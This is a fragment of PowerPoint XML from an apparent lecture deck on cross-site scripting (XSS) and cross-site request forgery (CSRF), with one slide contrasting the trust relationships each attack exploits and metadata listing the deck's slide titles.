            <a:endParaRPr sz="5383" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="object 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2332225" y="1997449"/>
            <a:ext cx="133069" cy="271613"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="11185">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1765" spc="269" dirty="0">
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>•</a:t>
            </a:r>
            <a:endParaRPr sz="1765">
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="object 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2622176" y="1944221"/>
            <a:ext cx="4953000" cy="366575"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="11185">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2382" spc="-4" dirty="0">
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Do not </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2382" spc="13" dirty="0">
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>confuse </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2382" spc="-4" dirty="0">
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>the</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2382" spc="-66" dirty="0">
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2382" spc="-4" dirty="0">
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>two:</a:t>
            </a:r>
            <a:endParaRPr sz="2382" dirty="0">
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="object 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2332225" y="2699218"/>
            <a:ext cx="133069" cy="271613"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="11185">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1765" spc="269" dirty="0">
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>•</a:t>
            </a:r>
            <a:endParaRPr sz="1765">
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="184326" name="object 6"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2622177" y="2669802"/>
            <a:ext cx="7199779" cy="6924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12700">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="2735"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2294" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>XSS exploits the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2294" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1333FF"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>trust </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2294" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>a client browser has in data sent  from the legitimate website</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="object 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2634783" y="3532655"/>
            <a:ext cx="134471" cy="271613"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="11185">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1765" spc="269" dirty="0">
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>•</a:t>
            </a:r>
            <a:endParaRPr sz="1765">
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="184328" name="object 8"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2924736" y="3476625"/>
            <a:ext cx="6278096" cy="713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12700">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="101000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2294" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>So the attacker tries to control what the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2294" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>website  sends to the client browser</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="object 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2332225" y="4590210"/>
            <a:ext cx="133069" cy="271613"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="11185">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1765" spc="269" dirty="0">
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>•</a:t>
            </a:r>
            <a:endParaRPr sz="1765">
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="184330" name="object 10"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2622177" y="4529978"/>
            <a:ext cx="6628279" cy="713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12700">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="101000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2294">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>CSRF exploits the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2294">
                <a:solidFill>
                  <a:srgbClr val="1333FF"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>trust </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2294">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>a legitimate website has in  data sent from the client browser</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="object 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2634783" y="5423647"/>
            <a:ext cx="134471" cy="271613"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="11185">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1765" spc="269" dirty="0">
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>•</a:t>
            </a:r>
            <a:endParaRPr sz="1765">
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="184332" name="object 12"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2924736" y="5370419"/>
            <a:ext cx="5964331" cy="713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12700">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="101000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2294" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>So the attacker tries to control what the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2294" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>client  browser sends to the website</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="291179726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3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4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5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 Boardroom</Template>
  <TotalTime>2234</TotalTime>
  <Words>3678</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>Widescreen</PresentationFormat>
  <Paragraphs>441</Paragraphs>
  <Slides>51</Slides>
  <Notes>5</Notes>
  <HiddenSlides>0</HiddenSlides>
  <MMClips>0</MMClips>
  <ScaleCrop>false</ScaleCrop>
  <HeadingPairs>
    <vt:vector size="6" baseType="variant">
      <vt:variant>
        <vt:lpstr>Fonts Used</vt:lpstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>11</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpstr>Theme</vt:lpstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>7</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpstr>Slide Titles</vt:lpstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>51</vt:i4>
      </vt:variant>
    </vt:vector>
  </HeadingPairs>
  <TitlesOfParts>
    <vt:vector size="69" baseType="lpstr">
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>Calibri</vt:lpstr>
      <vt:lpstr>Century Gothic</vt:lpstr>
      <vt:lpstr>Circular XX</vt:lpstr>
      <vt:lpstr>Courier New</vt:lpstr>
      <vt:lpstr>Google Sans</vt:lpstr>
      <vt:lpstr>Inter</vt:lpstr>
      <vt:lpstr>Roboto</vt:lpstr>
      <vt:lpstr>Times New Roman</vt:lpstr>
      <vt:lpstr>Varela Round</vt:lpstr>
      <vt:lpstr>Wingdings 3</vt:lpstr>
      <vt:lpstr>Ion Boardroom</vt:lpstr>
      <vt:lpstr>Office Theme</vt:lpstr>
      <vt:lpstr>1_Office Theme</vt:lpstr>
      <vt:lpstr>2_Office Theme</vt:lpstr>
      <vt:lpstr>3_Office Theme</vt:lpstr>
      <vt:lpstr>4_Office Theme</vt:lpstr>
      <vt:lpstr>5_Office Theme</vt:lpstr>
      <vt:lpstr>XSS and CSRF</vt:lpstr>
      <vt:lpstr>XSS</vt:lpstr>
      <vt:lpstr>Cross Site Scripting </vt:lpstr>
      <vt:lpstr>Cross Site Scripting </vt:lpstr>
      <vt:lpstr>Understanding XSS Vulnerability Attacks</vt:lpstr>
      <vt:lpstr>“Isn’t Cross-site Scripting the User’s Problem?”</vt:lpstr>
      <vt:lpstr>What can the attacker do with JavaScript </vt:lpstr>
      <vt:lpstr>How Cross-site Scripting Works</vt:lpstr>
      <vt:lpstr>Example</vt:lpstr>
      <vt:lpstr>Example </vt:lpstr>
      <vt:lpstr>Potential consequences of cross-site scripting attacks include: </vt:lpstr>
      <vt:lpstr>Stealing Cookies Using XSS </vt:lpstr>
      <vt:lpstr>Stealing Cookies Using XSS </vt:lpstr>
      <vt:lpstr>Type of XSS</vt:lpstr>
      <vt:lpstr>Stored XSS attack</vt:lpstr>
      <vt:lpstr>Stored XSS attack</vt:lpstr>
      <vt:lpstr>Stored XSS attack</vt:lpstr>
